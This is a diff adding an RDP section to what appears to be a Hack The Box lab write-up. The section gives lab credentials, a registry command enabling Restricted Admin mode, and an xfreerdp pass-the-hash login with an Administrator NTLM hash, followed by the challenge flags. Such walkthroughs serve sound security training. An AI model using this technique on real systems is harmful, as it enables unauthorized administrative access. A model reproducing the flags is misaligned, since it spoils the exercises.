@@ -3,6 +3,7 @@
 1. [FTP](#ftp)
 2. [SMB](#smb)
 3. [SQL](#sql)
+4. [RDP](#rdp)
 
 ### FTP
 #### Tools
@@ -152,3 +153,35 @@
     SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> 
     ```
     The answer is `HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}`.
+
+## RDP
+### Tools
+1. crowbar 
+2. hydra
+### Challenges
+1. What is the name of the file that was left on the Desktop? (Format example: filename.txt)
+
+    We can solve this by rdp to the target. In here i used `rdesktop`.
+
+    ```bash
+    rdesktop -u htb-rdp -p HTBRocks! 10.129.203.13
+    ```
+    Then we can explore the desktop. The answer is `pentest-notes.txt`.
+
+2. Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?
+
+    The answer is `DisableRestrictedAdmin`.
+
+3. Connect via RDP with the Administrator account and submit the flag.txt as you answer.
+
+    In the `pentest-notes.txt`, we can find admin credential with its hash (Administrator:0E14B9D6330BF16C30B1924111104824). Then to do xfreerdp with it, we must add new registry key.
+
+    ```powershell
+    reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+    ```
+    Then we can connect by using xfreerdp.
+
+    ```bash
+    xfreerdp /v:10.129.79.70 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824
+    ```
+    The answer is `HTB{RDP_P4$$_Th3_H4$#}`.
